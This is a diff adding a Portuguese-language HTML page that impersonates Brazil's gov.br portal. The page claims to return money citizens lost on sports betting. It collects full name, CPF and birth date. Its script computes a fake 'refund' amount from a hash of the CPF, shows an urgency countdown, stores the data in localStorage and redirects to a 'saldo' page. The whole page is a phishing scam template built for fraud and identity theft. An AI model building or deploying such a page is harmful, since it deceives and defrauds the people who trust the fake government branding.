@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<title>Valores a Receber | Consulta de Valores</title>
+<meta name="description" content="Consulte se você tem valores a receber referentes a apostas esportivas e jogos online.">
+<meta name="theme-color" content="#062451">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&family=Manrope:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+:root{
+--azul-900:#062451;--azul-800:#0a3265;--azul-btn:#1567f0;--azul-btn-hover:#0f56d1;
+--amarelo:#ffc81c;--texto:#2b364e;--muted:#798780;--borda:#dce5df;--fundo:#f6f8fb;
+}
+html{scroll-behavior:smooth}
+body{font-family:"DM Sans","Segoe UI",sans-serif;background:var(--fundo);color:var(--texto);line-height:1.6;font-weight:400;-webkit-font-smoothing:antialiased;text-rendering:optimizeLegibility}
+h1,h2,h3{font-family:"Manrope","Segoe UI",sans-serif;text-wrap:balance}
+button,input,select{font:inherit}
+.hero{background:radial-gradient(120% 120% at 80% 10%,#103a75 0%,#0a2c5c 38%,#041736 100%);color:#fff;padding:44px 20px 30px}
+.hero-inner{position:relative;z-index:1;max-width:520px;margin:0 auto}
+.hero h1{font-size:clamp(36px,9.5vw,46px);line-height:1.12;font-weight:600;letter-spacing:-.06em}
+.hero h1 span{color:var(--amarelo)}
+.hero p{margin:14px 0 20px;font-family:"DM Sans",sans-serif;font-size:14px;font-weight:400;line-height:1.7;color:#cdd9ec;max-width:440px}
+.hero-phone{display:flex;align-items:center;gap:12px;background:rgba(255,255,255,.08);border:1px solid rgba(255,255,255,.14);border-radius:12px;padding:12px 14px}
+.hero-phone .dot{width:36px;height:36px;border-radius:50%;background:#16a34a;display:flex;align-items:center;justify-content:center;font-size:18px;flex-shrink:0}
+.hero-phone small{display:block;font-size:11px;color:#bcd0ea}
+.hero-phone strong{font-family:"Manrope",sans-serif;font-size:13px;font-weight:700}
+.consulta-box{background:#fff;border:1px solid rgba(216,229,220,.93);border-radius:21px;padding:34px 24px 27px;box-shadow:0 22px 65px rgba(6,36,81,.10);margin-top:20px}
+.consulta-box h3{font-size:25px;font-weight:700;letter-spacing:-.045em;line-height:1.25;color:var(--azul-900)}
+.consulta-box p.sub{margin:8px 0 0;font-size:12px;line-height:1.5;color:#5f6f68}
+label{display:block;margin:16px 0 7px;font-size:11px;font-weight:700;color:#42584f}
+label:first-of-type{margin-top:20px}
+input,select{width:100%;height:48px;box-sizing:border-box;padding:0 13px;border:1px solid var(--borda);border-radius:8px;background:#fff;color:#26463a;font-size:16px;outline:none;transition:border-color .18s,box-shadow .18s}
+input::placeholder{color:#aab5af}
+input:hover,select:hover{border-color:#bacdc1}
+input:focus,select:focus{border-color:#549274;box-shadow:0 0 0 3px rgba(21,103,240,.12)}
+.consulta-grid{display:grid;grid-template-columns:1fr;gap:0}
+.btn-verificar{margin-top:24px;width:100%;min-height:48px;border:0;border-radius:9px;background:var(--azul-btn);color:#fff;font-family:"Manrope",sans-serif;font-size:12px;font-weight:700;letter-spacing:.02em;cursor:pointer;box-shadow:0 7px 14px rgba(21,103,240,.18)}
+.btn-verificar:hover{background:var(--azul-btn-hover)}
+.btn-verificar:active{transform:scale(.98)}
+.btn-verificar:disabled{opacity:.7;cursor:wait}
+.seguro{margin:14px 0 0;font-size:11px;text-align:center;color:#5f6f68}
+button:focus-visible,input:focus-visible,select:focus-visible{outline:3px solid rgba(21,103,240,.35);outline-offset:2px}
+@media(prefers-reduced-motion:reduce){*,*::before,*::after{animation-duration:.01ms!important;transition-duration:.01ms!important}}
+.resultado{display:none;margin-top:16px;border-radius:10px;padding:14px;font-size:13px;line-height:1.55}
+.resultado.loading{display:block;background:#fff8e1;border:1px solid #ffe082;color:#5a4300}
+.resultado.ok{display:block;background:#e8f5e9;border:1px solid #66bb6a;color:#1c664b}
+.resultado.erro{display:block;background:#fdecea;border:1px solid #f5a3a3;color:#8b1a1a;font-weight:500}
+.reserva{display:none;margin-top:12px;background:#fff7e6;border:1px dashed #e6a700;border-radius:10px;padding:10px 12px;font-size:12px;color:#5a4300}
+.reserva.show{display:block}
+footer{background:#071D41;padding:22px 20px 30px;text-align:center}
+footer .govbr-footer{height:26px;width:auto;display:block;margin:0 auto 10px}
+.copy{font-size:10px;color:#9db1d1}
+.govbar{background:#fff;border-bottom:1px solid #dce5df;padding:10px 16px;display:flex;align-items:center;justify-content:flex-start}
+.govbar img{height:28px;width:auto;display:block}
+.loading-overlay{position:fixed;inset:0;background:rgba(4,20,40,.55);display:none;align-items:center;justify-content:center;z-index:200;padding:20px}
+.loading-overlay.show{display:flex}
+.loading-box{background:#fff;border-radius:18px;padding:32px 28px;text-align:center;max-width:300px;width:100%}
+.spinner{width:56px;height:56px;margin:0 auto 16px;border-radius:50%;border:4px solid #dce5df;border-top-color:#1567f0;animation:gira 0.9s linear infinite}
+@keyframes gira{to{transform:rotate(360deg)}}
+.loading-box strong{display:block;font-family:"Manrope",sans-serif;font-size:15px;color:#062451}
+.loading-box small{font-size:12px;color:#798780}
+@media(min-width:768px){
+.hero{padding:56px 32px}.hero-inner{max-width:520px}
+.consulta-box{padding:34px 37px 31px}
+.consulta-grid{grid-template-columns:1fr 1fr;gap:13px}
+}
+</style>
+</head>
+<body>
+<header class="govbar"><img src="govbr.webp" alt="gov.br"></header>
+<section class="hero" id="inicio">
+<div class="hero-inner">
+<div>
+<h1>Você pode ter<br><span>valores a receber</span></h1>
+<p>Está sendo realizada a devolução dos valores perdidos por cidadãos em apostas esportivas e jogos online no último ano. Consulte se você tem direito de receber.</p>
+<div class="hero-phone">
+<div class="dot">✓</div>
+<div><small>Consulta 100% digital e gratuita</small><strong>Resultado em menos de 2 minutos</strong></div>
+</div>
+</div>
+<div class="consulta-box" id="consultar">
+<h3>Consulta de valores</h3>
+<p class="sub">Preencha para verificar nos registros disponíveis.</p>
+<div class="consulta-grid">
+<div><label for="nome">Nome completo</label><input id="nome" placeholder="Ex: Maria Silva" autocomplete="name"></div>
+<div><label for="cpf">CPF</label><input id="cpf" inputmode="numeric" placeholder="000.000.000-00" maxlength="14"></div>
+</div>
+<label for="nasc">Data de nascimento</label>
+<input id="nasc" type="text" inputmode="numeric" placeholder="DD/MM/AAAA" maxlength="10" autocomplete="bday">
+<button class="btn-verificar" id="btnVerificar">VERIFICAR SE TENHO VALORES →</button>
+<div class="reserva" id="reservaBox">Saldo reservado para o CPF <b id="cpfExibido"></b> por <b id="timer">15:00</b></div>
+<div class="resultado" id="resultado"></div>
+<p class="seguro">Seus dados estão protegidos com total sigilo e segurança.</p>
+</div>
+</div>
+</section>
+<footer><img class="govbr-footer" src="govbr-branco.png" alt="gov.br"><div class="copy">© 2026 — Consulta de Valores a Receber · Todos os direitos reservados</div></footer>
+<div class="loading-overlay" id="loadingOverlay">
+<div class="loading-box">
+<div class="spinner"></div>
+<strong>Consultando registros...</strong>
+<small>Aguarde, localizando seu saldo.</small>
+</div>
+</div>
+<script>
+const cpf=document.getElementById('cpf');
+cpf.addEventListener('input',()=>{
+let v=cpf.value.replace(/\D/g,'').slice(0,11);
+if(v.length>9)v=v.replace(/(\d{3})(\d{3})(\d{3})(\d{1,2})/,'$1.$2.$3-$4');
+else if(v.length>6)v=v.replace(/(\d{3})(\d{3})(\d{1,3})/,'$1.$2.$3');
+else if(v.length>3)v=v.replace(/(\d{3})(\d{1,3})/,'$1.$2');
+cpf.value=v;
+});
+const btnV=document.getElementById('btnVerificar'),res=document.getElementById('resultado');
+const nasc=document.getElementById('nasc');
+nasc.addEventListener('input',()=>{
+let v=nasc.value.replace(/\D/g,'').slice(0,8);
+if(v.length>4)v=v.replace(/(\d{2})(\d{2})(\d{1,4})/,'$1/$2/$3');
+else if(v.length>2)v=v.replace(/(\d{2})(\d{1,2})/,'$1/$2');
+nasc.value=v;
+});
+function anoValido(v){
+if(!v||v.length!==10)return false;
+var p=v.split('/');if(p.length!==3)return false;
+if(p[2].length!==4||!/^\d{4}$/.test(p[2]))return false;
+var dia=+p[0],mes=+p[1],ano=+p[2];
+if(ano<1900||mes<1||mes>12||dia<1||dia>31)return false;
+var h=new Date();
+var minData=new Date(h.getFullYear()-18,h.getMonth(),h.getDate());
+var d=new Date(ano,mes-1,dia);
+if(d.getFullYear()!==ano||d.getMonth()!==mes-1||d.getDate()!==dia)return false;
+return d<=minData;
+}
+const reservaBox=document.getElementById('reservaBox'),cpfExibido=document.getElementById('cpfExibido'),timerEl=document.getElementById('timer');
+let segundos=15*60,timerOn=false;
+function tick(){const m=String(Math.floor(segundos/60)).padStart(2,'0'),s=String(segundos%60).padStart(2,'0');if(timerEl)timerEl.textContent=m+':'+s;if(segundos>0)segundos--;else segundos=15*60;}
+setInterval(()=>{if(timerOn)tick();},1000);
+btnV.addEventListener('click',()=>{
+const nome=document.getElementById('nome').value.trim();
+const cpfFull=cpf.value;
+const overlay=document.getElementById('loadingOverlay');
+if(!nome||cpfFull.length<14){res.className='resultado erro';res.textContent='Preencha nome completo e CPF válido para continuar.';return;}
+if(!anoValido(nasc.value)){res.className='resultado erro';res.textContent='Informe sua data de nascimento com ano de 4 dígitos (ex: 1990) e idade mínima de 18 anos.';nasc.focus();return;}
+try{localStorage.setItem('vr_nasc',nasc.value);}catch(e){}
+res.className='';res.innerHTML='';
+overlay.classList.add('show');
+btnV.disabled=true;btnV.textContent='CONSULTANDO...';
+setTimeout(()=>{
+function valorPorCpf(cpfStr){
+var d=cpfStr.replace(/\D/g,'');var h=5381;
+for(var i=0;i<d.length;i++){h=((h<<5)+h+ +d[i])>>>0;}
+var base=2135+ (h%2846);
+var cent=(h>>7)%100;
+return base.toFixed(0)+','+String(cent).padStart(2,'0');
+}
+const valor=valorPorCpf(cpfFull);
+try{localStorage.setItem('vr_nome',nome);localStorage.setItem('vr_cpf',cpfFull);localStorage.setItem('vr_valor',valor);}catch(e){}
+window.location.href='saldo.html';
+},2200);
+});
+</script>
+</body>
+</html>
